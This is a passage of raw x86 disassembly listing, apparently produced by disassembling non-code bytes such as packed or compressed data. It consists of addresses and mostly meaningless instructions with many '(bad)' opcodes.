  4254e7:	rsqrtps xmm3,XMMWORD PTR [ebx-0x2e150402]
  4254ee:	jne    0x4254aa
  4254f0:	adc    DWORD PTR [ebp-0x74ef4c30],ebx
  4254f6:	inc    eax
  4254f7:	nop
  4254f8:	ret    
  4254f9:	mov    edi,0x53cf4de3
  4254fe:	mov    ch,BYTE PTR [ecx-0x79d57cd8]
  425504:	xor    ebx,DWORD PTR [eax]
  425506:	arpl   WORD PTR [edi+0x45],dx
  425509:	cmp    DWORD PTR [edi-0x19626971],0xffffffa2
  425510:	cmp    BYTE PTR [edx+0x7eb879b5],cl
  425516:	mov    bh,0x4a
  425518:	or     DWORD PTR [edx*1-0x269f7bc2],esp
  42551f:	inc    eax
  425520:	test   eax,0xcde80eb7
  425525:	rcr    edi,1
  425527:	jge    0x42552e
  425529:	es xor ch,ch
  42552c:	cmp    BYTE PTR [edx+0x59],dl
  42552f:	(bad)  
  425531:	cmp    bh,BYTE PTR [eax]
  425533:	in     eax,0x51
  425535:	arpl   WORD PTR [esi+esi*8-0x25],sp
  425539:	test   BYTE PTR [edi-0x57],bh
  42553c:	pop    ebx
  42553d:	test   DWORD PTR ds:0x2224aa49,edi
  425543:	mov    edx,0x3582e76b
  425548:	fisubr WORD PTR [edx-0x41]
  42554b:	xchg   ecx,eax
  42554c:	and    al,0x6e
  42554e:	ins    BYTE PTR es:[edi],dx
  42554f:	fisttp QWORD PTR [edx+0x2b]
  425552:	stos   BYTE PTR es:[edi],al
  425553:	stos   DWORD PTR es:[edi],eax
  425554:	jns    0x42554c
  425556:	xchg   BYTE PTR [ebp+0x1f],ah
  425559:	mov    bh,0xdc
  42555b:	or     BYTE PTR [edx+0x3034cd11],bl
  425561:	(bad)  
  425562:	test   eax,0x26d54d8a
  425567:	adc    DWORD PTR [ecx],eax
  425569:	sub    DWORD PTR [eax+ebx*8],ebx
  42556c:	and    al,0x83
  42556e:	xor    DWORD PTR [eax+0x3e],ebp
  425571:	xlat   BYTE PTR ds:[ebx]
  425572:	cmp    dh,BYTE PTR [esi-0x13]
  425575:	pop    esi
  425576:	mov    edx,0xf20e8100
  42557b:	adc    edx,edx
  42557d:	stc    
  42557e:	fs sub al,0x63
  425581:	cmp    BYTE PTR [ebp+ebx*1-0x1c9fc255],0xf2
  425589:	retf   
  42558a:	(bad)  
  42558b:	stos   BYTE PTR es:[edi],al
  42558c:	ins    BYTE PTR es:[edi],dx
  42558d:	push   ds
  42558e:	sar    DWORD PTR [ebx+0x56],1
  425591:	mov    ah,0x33
  425593:	jl     0x425578
  425595:	mov    ds:0xdbf52578,eax
  42559a:	cmp    bl,al
  42559c:	cdq    
  42559d:	push   es
  42559e:	and    esp,DWORD PTR ds:0xd1688c47
  4255a4:	mov    ds:0x14782930,eax
  4255a9:	je     0x4255cb
  4255ab:	gs mov edi,0xce321b44
  4255b1:	in     al,0xe6
  4255b3:	iret   
  4255b4:	or     BYTE PTR [edx-0x3454f009],dl
  4255ba:	and    eax,0xe70c42be
  4255bf:	jne    0x425632
  4255c1:	sbb    al,cl
  4255c3:	pop    edx
  4255c4:	mov    ah,0xc0
  4255c6:	popa   
  4255c7:	test   al,0xc4
  4255c9:	in     al,0xbc
  4255cb:	push   0x9b778991
  4255d0:	jae    0x425609
  4255d2:	push   ebp
  4255d3:	std    
  4255d4:	loopne 0x4255cc
  4255d6:	lods   eax,DWORD PTR ds:[esi]
  4255d7:	and    BYTE PTR [edi],ch
  4255d9:	data16 (bad) 
  4255dc:	mov    es,WORD PTR [ebp-0xc]
  4255df:	or     DWORD PTR [eax-0x1d794855],0xffffffb6
  4255e6:	fbstp  TBYTE PTR ds:0x563be54b
  4255ec:	push   edx
  4255ed:	sub    bl,BYTE PTR [edx+0x28]
  4255f0:	sub    al,0x9b
  4255f2:	clc    
  4255f3:	hlt    
  4255f4:	push   eax
  4255f5:	xchg   esp,eax
  4255f6:	scas   eax,DWORD PTR es:[edi]
  4255f7:	fisttp DWORD PTR [ecx-0x25b1f9ae]
  4255fd:	(bad)  
  4255ff:	hlt    
  425600:	pop    ds
  425601:	mov    bh,0x24
  425603:	mov    gs,WORD PTR [edi]
  425605:	(bad)  [edi-0x2e]
  425608:	aaa    
  425609:	mov    ch,0xc3
  42560b:	sbb    eax,DWORD PTR [edx+ebx*2+0x54641f4e]
  425612:	xor    al,0xf1
  425614:	test   DWORD PTR [ebp-0x7d],ebp
  425617:	leave  
  425618:	or     al,0xeb
  42561a:	loop   0x425673
  42561c:	cwde   
  42561d:	mov    bh,0x2b
  42561f:	adc    al,0xbd
  425621:	idiv   BYTE PTR [esi-0x1f1a2dcf]
  425627:	and    eax,0xd8509eb0
  42562c:	cmp    dh,BYTE PTR [ecx-0xb5156a8]
  425632:	adc    dh,al
  425634:	add    DWORD PTR [ebp+0x12121547],esp
  42563a:	les    edi,FWORD PTR [esi]
  42563c:	and    ecx,0xf4864e3d
  425642:	xchg   ebp,eax
  425643:	and    BYTE PTR [eax],dl
  425645:	sbb    eax,0xc392a932
  42564a:	mov    bl,0x9a
  42564c:	sub    BYTE PTR [esi],al
  42564e:	cld    
  42564f:	mov    ds:0x784c07a,eax
  425654:	add    eax,0x2b2de221
  425659:	test   DWORD PTR [edx+0x5a],eax
  42565c:	pop    edx
  42565d:	add    eax,0xe37d20db
  425662:	out    0x12,al
  425664:	mov    bl,0xda
  425666:	mov    dl,0x8e
  425668:	inc    esi
  425669:	in     al,dx
  42566a:	fldcw  WORD PTR [edi+0x4cdf7a02]
  425670:	cmovle edx,DWORD PTR [esi]
  425673:	cmp    al,0xae
  425675:	aam    0xf3
  425677:	ss and al,0x2f
  42567a:	adc    DWORD PTR [eax],ebp
  42567c:	adc    eax,0xf29dff9b
  425681:	pushf  
  425682:	sub    edx,DWORD PTR [esi+ebx*8+0x2d81dea4]
  425689:	push   eax
  42568a:	sbb    dl,BYTE PTR [ebx+0x2c64424a]
  425690:	xchg   edi,eax
  425691:	in     al,dx
  425692:	test   ebp,esi
  425694:	pop    edi
  425695:	mov    cl,0xd1
  425697:	movzx  esi,BYTE PTR [ecx-0x70]
  42569b:	and    DWORD PTR [edi-0x5b],eax
  42569e:	or     al,BYTE PTR [edx+0x19ef535]
  4256a4:	mov    bh,ch
  4256a6:	xor    eax,0xa1859af4
  4256ab:	sbb    dh,BYTE PTR [ebp-0x77]
  4256ae:	nop
  4256af:	cmp    eax,DWORD PTR [eax]
	...
  4256b9:	add    BYTE PTR [esi+0x74ef74ea],bh
  4256bf:	(bad)  
  4256c0:	mov    edi,0x93a446fb
  4256c5:	nop
  4256c6:	xor    dl,ah
  4256c8:	push   0x1f
  4256ca:	mov    esp,0xfe0001ce
  4256cf:	add    DWORD PTR [eax],eax
  4256d1:	add    ah,cl
  4256d3:	jmp    0x425673
  4256d5:	sar    BYTE PTR [eax+0x5c],1
  4256d8:	push   ebp
  4256d9:	sar    DWORD PTR [ebx+0x64bba554],0x36
  4256e0:	nop
  4256e1:	fwait
  4256e2:	jb     0x4256fe
  4256e4:	sbb    DWORD PTR [edi],0x61
  4256e7:	into   
  4256e8:	jmp    0x51a5:0x8c0137bc
  4256ef:	loope  0x4256ce
  4256f1:	and    ebx,ecx
  4256f3:	adc    BYTE PTR [edx],al
  4256f5:	out    dx,al
  4256f6:	xor    DWORD PTR [esi+0x6acf8a0d],0xffffff86
  4256fd:	mov    eax,?
  4256ff:	(bad)  
  425700:	fcomp  QWORD PTR [ebx-0x20b54b05]
  425706:	iret   
  425707:	mov    esp,0x96cc26a6
  42570c:	sbb    al,0xaf
  42570e:	mov    BYTE PTR [edi-0x4021ccd3],0xc2
  425715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425716:	shr    ecx,cl
  425718:	mov    edi,0x8e44acf9
  42571d:	(bad)  
  42571e:	xlat   BYTE PTR ds:[ebx]
  42571f:	add    eax,0xe6cc5861
  425724:	cmp    eax,0x7ec6cf19
  425729:	pop    edx
  42572a:	js     0x425709
  42572c:	lds    eax,FWORD PTR [eax+0x39]
  42572f:	or     ebx,DWORD PTR [ebx*2+0x420c9572]
  425736:	jg     0x42575b
  425738:	pusha  
  425739:	jge    0x42579c
  42573b:	push   es
  42573c:	cld    
  42573d:	aam    0xb0
  42573f:	adc    dl,BYTE PTR [ebx-0x3d]
  425742:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425744:	lods   al,BYTE PTR ds:[esi]
  425745:	dec    ecx
  425746:	dec    edi
  425747:	pop    ecx
  425748:	out    dx,al
  425749:	clc    
  42574a:	lods   al,BYTE PTR ds:[esi]
  42574b:	rcr    esi,1
  42574d:	test   DWORD PTR [ebp-0x32],eax
  425750:	sbb    eax,0xa8a95be5
  425755:	out    dx,al
  425756:	add    al,0x39
  425758:	or     cl,cl
  42575a:	jmp    0x4257b6
  42575c:	outs   dx,DWORD PTR ds:[esi]
  42575d:	mov    eax,0xa824149c
  425762:	inc    edx
  425763:	cmp    al,0xb1
  425765:	pop    edx
  425766:	pop    ebp
  425767:	and    eax,0x900d815b
  42576c:	xchg   ebx,eax
  42576d:	jmp    0x42577b
  42576f:	in     eax,0x30
  425771:	retf   0xcdbb
  425774:	cwde   
  425775:	ret    
  425776:	jmp    0x4256f9
  425778:	sti    
  425779:	jno    0x4257e7
  42577b:	add    BYTE PTR [ecx],dl
  42577d:	stos   DWORD PTR es:[edi],eax
  42577e:	clc    
  42577f:	sbb    dh,dl
  425781:	aaa    
  425782:	lahf   
  425783:	mov    eax,0xdaa367f1
  425788:	mov    edx,esi
  42578a:	shl    edi,1
  42578c:	ins    BYTE PTR es:[edi],dx
  42578d:	cld    
  42578e:	call   0x61e2d722
  425793:	das    
  425794:	adc    BYTE PTR [ebx+0x3e842c52],al
  42579a:	sbb    ah,0xc3
  42579d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42579e:	inc    DWORD PTR [edi+0x47599587]
  4257a4:	imul   ebp,DWORD PTR [ecx-0x5a97f6d9],0x4e61b32f
  4257ae:	mov    al,0x8a
  4257b0:	in     al,0x20
  4257b2:	adc    DWORD PTR cs:[eax+ebp*4],esi
  4257b6:	lea    edx,ds:[edx-0x3f]
  4257ba:	mov    ebp,0xa0962e24
  4257bf:	mov    ds:0xf0849fb8,al
  4257c4:	add    BYTE PTR [eax],ah
  4257c6:	pop    ds
  4257c7:	push   cs
  4257c8:	(bad)
  4257cc:	push   ds
  4257cd:	test   DWORD PTR [edi+edx*2-0x69a68d1e],0x74be96e2
  4257d8:	or     DWORD PTR [esp+ecx*4-0x62],eax
  4257dc:	test   eax,0xc8c4cfa9
  4257e1:	iret   
  4257e2:	in     al,dx
  4257e3:	jmp    0x425822
  4257e5:	xlat   BYTE PTR ds:[ebx]
  4257e6:	cmp    eax,0x67329e0d
  4257eb:	cdq    
  4257ec:	or     al,BYTE PTR cs:[ebx-0x1b1c6dd]
  4257f3:	sbb    ecx,DWORD PTR [ebx]
  4257f5:	jne    0x42584d
  4257f7:	retf   0x65ce
  4257fa:	xchg   edx,eax
  4257fc:	inc    esi
  4257fd:	(bad)  
  4257fe:	push   0xffffff8d
  425800:	inc    edx
  425801:	ret    
  425802:	out    0xf,eax
  425804:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425805:	out    dx,eax
  425806:	pop    esp
  425807:	test   al,0x9c
  425809:	sub    al,0xe1
  42580b:	repnz retf 
  42580d:	sub    DWORD PTR [ebp-0x4a14d51],esi
  425813:	out    dx,eax
  425814:	mov    bl,0xfd
  425816:	push   edi
  425817:	dec    edx
  425818:	cs inc edi
  42581a:	clc    
  42581b:	scas   eax,DWORD PTR es:[edi]
  42581c:	dec    edi
  42581d:	std    
  42581e:	rcl    BYTE PTR [ebp-0x468884c8],0x14
  425825:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425826:	push   esp
  425827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425828:	sbb    ebx,DWORD PTR [edx+edx*4-0x1e]
  42582c:	out    0xf6,eax
  42582e:	and    eax,0xb0155f84
  425833:	out    0x1c,al
  425835:	clc    
  425836:	xor    eax,0x1a2a3988
  42583b:	retf   0xf13a
  42583e:	xlat   BYTE PTR ds:[ebx]
  42583f:	rcl    BYTE PTR [edx],1
  425841:	in     eax,dx
  425842:	mov    al,bh
  425844:	out    dx,al
  425845:	cmp    ebx,DWORD PTR [ecx-0x5c]
  425848:	enter  0xd9ba,0xab
  42584c:	(bad)
  425850:	pop    es
  425851:	mov    esi,0x66379771
  425856:	(bad)  
  425857:	and    al,bh
  425859:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42585a:	adc    al,0x35
  42585c:	lea    edx,[edx-0x6089464e]
  425862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425863:	out    dx,al
  425864:	(bad)  
  425865:	leave  
  425866:	stos   BYTE PTR es:[edi],al
  425867:	jg     0x425851
  425869:	stos   DWORD PTR es:[edi],eax
  42586a:	dec    eax
  42586b:	sahf   
  42586c:	(bad)  
  42586d:	in     eax,dx
  42586e:	adc    BYTE PTR [ebx-0x79009d62],al
  425874:	mov    bh,0x55
  425876:	xchg   ebx,eax
  425877:	ror    DWORD PTR [ecx-0x68],0x7c
  42587b:	es in  eax,dx
  42587d:	sti    
  42587e:	cdq    
  42587f:	daa    
  425880:	push   ebx
  425881:	fcom   DWORD PTR [edi]
  425883:	call   0x7e30b376
  425888:	dec    ebx
  425889:	(bad)  
  42588a:	jns    0x4258ea
  42588c:	sahf   
  42588d:	das    
  42588e:	int    0xf6
  425890:	xchg   BYTE PTR [eax+0xc],ch
  425893:	jmp    0x42585f
  425895:	xor    edi,DWORD PTR [ecx-0x429cf3f7]
  42589b:	sbb    al,0x1f
  42589d:	pop    ebx
  42589e:	inc    ecx
  42589f:	js     0x4258c4
  4258a1:	stos   DWORD PTR es:[edi],eax
  4258a2:	mov    WORD PTR [ebx-0x34],fs
  4258a5:	sbb    eax,0x23e4149e
  4258aa:	pop    eax
  4258ab:	xchg   ebx,eax
  4258ac:	sbb    eax,DWORD PTR [ecx]
  4258ae:	xor    al,0xf8
  4258b0:	xchg   ecx,eax
  4258b1:	pop    esi
  4258b2:	jno    0x425886
  4258b4:	add    eax,DWORD PTR [edx+edi*1]
  4258b7:	sar    BYTE PTR [ecx+ebp*8+0x66],1
  4258bb:	mov    esi,0xda1db990
  4258c0:	call   0xfa1d:0x9644cfae
  4258c7:	aad    0x75
  4258c9:	dec    esi
  4258ca:	lea    ebx,[eax]
  4258cc:	cs in  eax,0x7c
  4258cf:	enter  0x0,0x0
  4258d3:	add    BYTE PTR [eax],al
  4258d5:	add    BYTE PTR [eax],al
  4258d7:	add    BYTE PTR [eax],al
  4258d9:	add    BYTE PTR [ebx+0x45],cl
  4258dc:	mov    edx,0x5fffbeee
  4258e1:	in     eax,0xe9
  4258e3:	dec    esi
  4258e4:	cmp    ch,ah
  4258e6:	mov    BYTE PTR [ebp+0x47],bl
  4258e9:	out    dx,eax
  4258ea:	mov    edx,0xfe0001d0
  4258ef:	add    DWORD PTR [eax],eax
  4258f1:	add    BYTE PTR [ebp-0x6b],dh
  4258f4:	xchg   ecx,eax
  4258f5:	xlat   BYTE PTR ds:[ebx]
  4258f6:	repnz pop eax
  4258f8:	sub    DWORD PTR [esi+0x5a],0x4d83841f
  4258ff:	(bad)  
  425900:	xor    eax,0x92075b61
  425905:	xchg   edi,eax
  425906:	(bad)  
  425907:	cld    
  425908:	imul   esi,DWORD PTR [edi+0x7b],0x1e6b9262
  42590f:	mov    BYTE PTR [esi-0x66523e10],ch
  425915:	(bad)  
  425916:	and    al,0x11
  425918:	add    al,0xbd
  42591a:	mov    ds:0x81c69914,al
  42591f:	bound  esi,QWORD PTR [esi-0x60417709]
  425925:	stc    
  425926:	leave  
  425927:	and    BYTE PTR ds:0xc3380ad1,cl
  42592d:	scas   eax,DWORD PTR es:[edi]
  42592e:	mov    ch,0xd9
  425930:	out    0x75,al
  425932:	arpl   sp,ax
  425934:	jmp    0x425913
  425936:	pop    ds
  425937:	out    dx,eax
  425938:	ret    0x6b56
  42593b:	js     0x42592d
  42593d:	or     al,0xfd
  42593f:	pop    ds
  425940:	mov    edi,0x29c414cd
  425945:	mov    dh,0xd3
  425947:	jp     0x4258f1
  425949:	das    
  42594a:	xchg   esp,eax
  42594b:	adc    BYTE PTR [edi+ecx*1+0x5],ah
  42594f:	rcr    BYTE PTR [ebx+eax*2],0x96
  425953:	xchg   ebx,eax
  425954:	cmp    al,0x25
  425956:	cmp    BYTE PTR [ebp+0x78f7e3e3],ah
  42595c:	jo     0x42596f
  42595e:	imul   edi,esi,0x6f
  425961:	pop    eax
  425962:	jnp    0x42594d
  425964:	fcom   st(0)
  425966:	mov    eax,ds:0x2400a5fa
  42596b:	mov    ebx,0x61be5829
  425970:	jp     0x425919
  425972:	icebp  
  425973:	ficom  WORD PTR [ebp-0x4bcf0ed4]
  425979:	dec    ebx
  42597a:	adc    bh,BYTE PTR [edi]
  42597c:	mov    bl,0x63
  42597e:	loope  0x425933
  425980:	dec    ebx
  425981:	lods   al,BYTE PTR ds:[esi]
  425982:	cmp    BYTE PTR [edi+edx*1-0x19],ch
  425986:	jmp    0xa239:0x50d3e9c1
  42598d:	fcmovbe st,st(1)
  42598f:	arpl   WORD PTR [eax-0x2fabfdd2],si
  425995:	pop    edx
  425996:	and    DWORD PTR [ecx+0x50],ecx
  425999:	iret   
  42599a:	out    0xf0,al
  42599c:	add    eax,0x48
  42599f:	cmp    ecx,ebx
  4259a1:	lods   al,BYTE PTR ds:[esi]
  4259a2:	stos   DWORD PTR es:[edi],eax
  4259a3:	sbb    DWORD PTR gs:[ecx+0x74],esi
  4259a7:	sbb    esp,DWORD PTR [ebp*1-0x4e4b2e21]
  4259ae:	sbb    DWORD PTR [edi],0x72aae610
  4259b4:	mov    eax,ds:0x758dcb0b
  4259b9:	mov    DWORD PTR [esi+0x42282121],eax
  4259bf:	jns    0x42597a
  4259c1:	jbe    0x425a2e
  4259c3:	pop    ds
  4259c4:	mov    ah,0x1d
  4259c6:	and    al,0xf9
  4259c8:	not    DWORD PTR ds:0x7825a26f
  4259ce:	add    al,0x4f
  4259d0:	test   al,0xfe
  4259d2:	or     BYTE PTR [ecx+0x7db401b6],bh
  4259d8:	mov    al,0x37
  4259da:	ss (bad) 
  4259dc:	(bad)
  4259df:	mov    esp,0x1f8e7522
  4259e4:	and    ch,BYTE PTR [esi-0x85c2d6d]
  4259ea:	dec    eax
  4259eb:	jp     0x425a58
  4259ed:	fdivr  DWORD PTR [eax+ecx*4+0x23cf4231]
  4259f4:	and    esp,DWORD PTR [ebp-0x6d]
  4259f7:	loop   0x425a6d
  4259f9:	ficomp DWORD PTR [edi+eiz*8]
  4259fc:	test   DWORD PTR [ebp+0x39a9771f],edx
  425a02:	out    0xe2,al
  425a04:	lds    ebp,FWORD PTR [ecx]
  425a06:	fcomip st,st(2)
  425a08:	jmp    0x425a70
  425a0a:	loopne 0x425a43
  425a0c:	popa   
  425a0d:	test   DWORD PTR [ecx],edi
  425a0f:	inc    esp
  425a10:	mov    al,0xd0
  425a12:	cdq    
  425a13:	inc    edi
  425a14:	ins    BYTE PTR es:[edi],dx
  425a15:	je     0x425a40
  425a17:	aas    
  425a18:	jno    0x4259b0
  425a1a:	and    eax,DWORD PTR [ecx+0x618628a2]
  425a20:	ficom  DWORD PTR [edi-0x178a8ba4]
  425a26:	into   
  425a27:	xor    cl,0x26
  425a2a:	jl     0x425a21
  425a2c:	and    al,0xf2
  425a2e:	cld    
  425a2f:	sbb    dl,BYTE PTR [ebp-0xa7b547d]
  425a35:	mov    ecx,0x7f82e0c9
  425a3a:	jmp    0x5673:0x85dcc739
  425a41:	push   ebp
  425a42:	add    DWORD PTR [edi-0x42ce716e],esp
  425a48:	clc    
  425a49:	jne    0x4259d1
  425a4b:	cli    
  425a4c:	inc    esi
  425a4d:	(bad)  [ebx+ecx*8-0xe5bcd08]
  425a54:	add    DWORD PTR [ebx+eax*1],0xf5daf373
  425a5b:	icebp  
  425a5c:	test   BYTE PTR [ecx],dl
  425a5e:	in     al,0x5b
  425a60:	das    
  425a61:	pop    edx
  425a62:	add    DWORD PTR [edx+0x7],edx
  425a65:	jle    0x425aa1
  425a67:	push   edx
  425a68:	shrd   eax,ebp,cl
  425a6b:	mov    al,ds:0x3fc00876
  425a70:	aas    
  425a71:	popf   
  425a72:	stos   DWORD PTR es:[edi],eax
  425a73:	lods   al,BYTE PTR ds:[esi]
  425a74:	mov    ds:0x9e94ff1d,al
  425a79:	(bad)
  425a7d:	ja     0x425a19
  425a7f:	xchg   esi,eax
  425a80:	jo     0x425a0f
  425a82:	sub    dl,BYTE PTR [esi+ebx*2-0x7d9669a3]
  425a89:	push   edi
  425a8a:	call   0xef3f:0xafaf5d63
  425a91:	pop    eax
  425a92:	scas   eax,DWORD PTR es:[edi]
  425a93:	shl    DWORD PTR [esi],cl
  425a95:	pop    esp
  425a96:	lea    edx,[edx]
  425a98:	arpl   WORD PTR [esi+edx*8-0x78],bp
  425a9c:	push   ecx
  425a9d:	lahf   
  425a9e:	mov    eax,ds:0x6312a94a
  425aa3:	mov    al,ds:0xbf38e834
  425aa8:	aaa    
  425aa9:	add    eax,0xce3e6657
  425aae:	stc    
  425aaf:	pop    eax
  425ab0:	adc    BYTE PTR [esi],dl
  425ab2:	add    ah,BYTE PTR [eax-0x2f]
  425ab5:	mov    esp,0x82df1066
  425aba:	dec    edx
  425abb:	imul   esp,DWORD PTR [esi-0xb],0x9
  425abf:	je     0x425abb
  425ac1:	dec    ebp
  425ac2:	ficom  WORD PTR [edx-0x24]
  425ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ac6:	dec    eax
  425ac7:	sbb    esi,DWORD PTR [ecx]
  425ac9:	ror    BYTE PTR [ebp+0x31],1
  425acc:	mov    al,0x5f
  425ace:	fldenv [eax-0x65f42a5f]
  425ad4:	cdq    
  425ad5:	ins    DWORD PTR es:[edi],dx
  425ad6:	inc    ebx
  425ad7:	or     bh,al
  425ad9:	jae    0x425b3e
  425adb:	in     al,0xc3
  425add:	into   
  425ade:	mov    cl,0x88
  425ae0:	dec    esp
  425ae1:	les    ebx,FWORD PTR [edi]
  425ae3:	call   0x4a9f:0xbef7f3ec
  425aea:	mov    ah,ah
  425aec:	sti    
  425aed:	inc    esp
  425aee:	inc    ecx
  425aef:	clc    
	...
  425af8:	add    BYTE PTR [eax],al
  425afa:	stos   BYTE PTR es:[edi],al
  425afb:	jo     0x425add
  425afd:	dec    ecx
  425afe:	cli    
  425aff:	fldcw  WORD PTR [ebx+0x2d6367f3]
  425b05:	(bad)  
  425b06:	jns    0x425b1a
  425b08:	das    
  425b09:	pop    es
  425b0a:	mov    eax,0xfe0001d2
  425b0f:	add    DWORD PTR [eax],eax
  425b11:	add    BYTE PTR [esi-0x17bb1db7],dh
  425b17:	cmp    al,0xc8
  425b19:	xchg   edx,eax
  425b1a:	imul   ecx,DWORD PTR [edi],0x6e
  425b1d:	imul   edx,DWORD PTR [edx-0x51],0x1
  425b21:	push   ebp
  425b22:	pop    esi
  425b23:	mov    bl,BYTE PTR [ebp+0x69]
  425b26:	outs   dx,DWORD PTR ds:[esi]
  425b27:	mov    edi,0x76c35b4a
  425b2c:	popa   
  425b2d:	jne    0x425ba9
  425b2f:	fdivr  QWORD PTR [edx+0x7]
  425b32:	leave  
  425b33:	aam    0x47
  425b35:	pop    edi
  425b36:	imul   ecx,DWORD PTR [ecx+ebx*1],0x21
  425b3a:	ret    0xd0c3
  425b3d:	add    al,0x9c
  425b3f:	pop    edi
  425b40:	mov    ebx,0x12e9accd
  425b45:	xchg   ebp,eax
  425b46:	js     0x425b66
  425b48:	sahf   
  425b49:	div    ebx
  425b4b:	fs xor ebp,esp
  425b4e:	fadd   QWORD PTR [edx+0x55]
  425b51:	adc    eax,0x3d0dbfa2
  425b56:	and    al,0xc1
  425b58:	or     DWORD PTR [ebx-0x38],ecx
  425b5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b5c:	jecxz  0x425bc8
  425b5e:	cs sahf 
  425b60:	add    al,0xcd
  425b62:	imul   ebp,DWORD PTR [ebx],0xffffff9b
  425b65:	sub    dl,BYTE PTR [esi-0x6b]
  425b68:	adc    DWORD PTR [eax-0x33],ebp
  425b6b:	xor    al,0xd7
  425b6d:	push   ds
  425b6e:	loop   0x425bdb
  425b70:	test   BYTE PTR [esi+ebx*8-0x3],ch
  425b74:	mov    BYTE PTR [eax+0x175bb664],0x6
  425b7b:	jmp    0x9f27:0x53da72d0
  425b82:	fist   DWORD PTR [ebp-0x27]
  425b85:	adc    DWORD PTR gs:0xa2b3387e,0x4
  425b8d:	inc    ebx
  425b8e:	icebp  
  425b8f:	dec    ecx
  425b90:	pop    ds
  425b91:	cs pop ebp
  425b93:	test   BYTE PTR [ebp+0x422ef1be],0x48
  425b9a:	push   eax
  425b9b:	mov    ecx,0xcf999ac7
  425ba0:	icebp  
  425ba1:	sub    DWORD PTR [edx+ecx*2+0x40f3f82a],ebx
  425ba8:	jbe    0x425c08
  425baa:	imul   edi,edi,0x6f
  425bad:	xchg   esi,eax
  425bae:	test   BYTE PTR [ebx],bh
  425bb0:	ins    DWORD PTR es:[edi],dx
  425bb1:	fwait
  425bb2:	lods   eax,DWORD PTR ds:[esi]
  425bb3:	sub    eax,0xbede4330
  425bb8:	sub    dh,cl
  425bba:	lea    ebx,[edi]
  425bbc:	push   edi
  425bbd:	cs jle 0x425c0f
  425bc0:	push   ds
  425bc1:	dec    edx
  425bc2:	sub    ah,BYTE PTR [ecx]
  425bc4:	(bad)  
  425bc5:	fistp  QWORD PTR [eax-0x17]
  425bc8:	mov    esi,0xf4d055d5
  425bcd:	stc    
  425bce:	cmovbe ebx,DWORD PTR [eax]
  425bd1:	mov    esi,edx
  425bd3:	jmp    0x38f8:0xcc8fb326
  425bda:	xchg   edx,eax
  425bdb:	test   eax,0x540fab78
  425be0:	and    eax,0x2c862720
  425be5:	out    dx,eax
  425be6:	icebp  
  425be7:	out    dx,al
  425be8:	add    DWORD PTR [edi],esi
  425bea:	and    edx,DWORD PTR [edx]
  425bec:	xor    al,0x66
  425bee:	dec    esp
  425bef:	repz repz inc ebp
  425bf2:	call   0x9f2b79b2
  425bf7:	test   DWORD PTR [ebx+ebp*1+0x2df9bb6b],0xb9074738
  425c02:	cli    
  425c03:	ss (bad) 
  425c05:	(bad)  [eax]
  425c07:	test   BYTE PTR [edi-0x3b],ch
  425c0a:	mov    ch,BYTE PTR [ecx+0x4d936792]
  425c10:	jmp    0x425bd6
  425c12:	mov    BYTE PTR es:[ebx+0x4aebd66c],0x75
  425c1a:	out    dx,al
  425c1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c1c:	add    ebp,DWORD PTR [ecx-0x63]
  425c1f:	stos   BYTE PTR es:[edi],al
  425c20:	mov    DWORD PTR [ecx-0x3f],edx
  425c23:	push   ds
  425c24:	push   eax
  425c25:	pushf  
  425c26:	in     eax,dx
  425c27:	icebp  
  425c28:	mov    bl,0xbe
  425c2a:	loope  0x425c10
  425c2c:	shl    BYTE PTR [ecx-0x47],1
  425c2f:	retf   
  425c30:	ds inc ebx
  425c32:	mov    esi,0x128e6d13
  425c37:	pop    eax
  425c38:	add    ah,BYTE PTR [edx+0x6a5da82c]
  425c3e:	mov    eax,ds:0x46c77ffd
  425c43:	or     al,0x50
  425c45:	stos   BYTE PTR es:[edi],al
  425c46:	(bad)  
  425c47:	gs dec ecx
  425c49:	or     al,0xb4
  425c4b:	mov    ebp,0xdddb3b7f
  425c50:	dec    ebx
  425c51:	jmp    0x425c50
  425c53:	inc    eax
  425c54:	xchg   BYTE PTR [ebp-0x48],ah
  425c57:	sub    al,0x45
  425c59:	lock jae 0x425c38
  425c5c:	mov    WORD PTR [edx],?
  425c5e:	test   BYTE PTR [ebx+0x90a9dd5],0x7a
  425c65:	in     al,0x59
  425c67:	xchg   esi,eax
  425c68:	sub    DWORD PTR [edi+0x4],esi
  425c6b:	cmp    al,0x4
  425c6d:	xor    eax,0x5408b79a
  425c72:	pop    ebp
  425c73:	mov    al,ds:0x43bb04b5
  425c78:	jbe    0x425c4b
  425c7a:	sbb    BYTE PTR [esi+ecx*4],0x53
  425c7e:	mul    DWORD PTR [ebx-0x2b]
  425c81:	out    0xd1,eax
  425c83:	inc    esi
  425c84:	into   
  425c85:	mov    edi,0xfcfd7fb0
  425c8a:	or     DWORD PTR [esi-0x21],ecx
  425c8d:	push   ecx
  425c8e:	lea    esi,[esi+0x59]
  425c91:	sub    eax,0x9c721b45
  425c96:	jmp    0x2f8486a4
  425c9b:	inc    eax
  425c9c:	popf   
  425c9d:	push   ecx
  425c9e:	mov    dh,0x1f
  425ca0:	ret    
  425ca1:	pop    ds
  425ca2:	loopne 0x425c4b
  425ca4:	add    edi,DWORD PTR [edi]
  425ca6:	(bad)  
  425ca8:	or     eax,0x2814a964
  425cad:	pop    ebp
  425cae:	push   edx
  425caf:	jnp    0x425cd5
  425cb1:	out    dx,al
  425cb2:	mov    esp,0xbe1d3e49
  425cb7:	jno    0x425ca4
  425cb9:	or     eax,0xc296e779
  425cbe:	nop
  425cbf:	mov    eax,0xc74f101c
  425cc4:	repz mov cl,0x69
  425cc7:	xchg   ebx,eax
  425cc8:	jmp    0x28ec4542
  425ccd:	jo     0x425d0f
  425ccf:	lea    ecx,[edx-0xf]
  425cd2:	int3   
  425cd3:	mov    bl,0x5c
  425cd5:	cmp    al,BYTE PTR [ebx-0x65]
  425cd8:	jecxz  0x425c7f
  425cda:	sahf   
  425cdb:	loop   0x425c9e
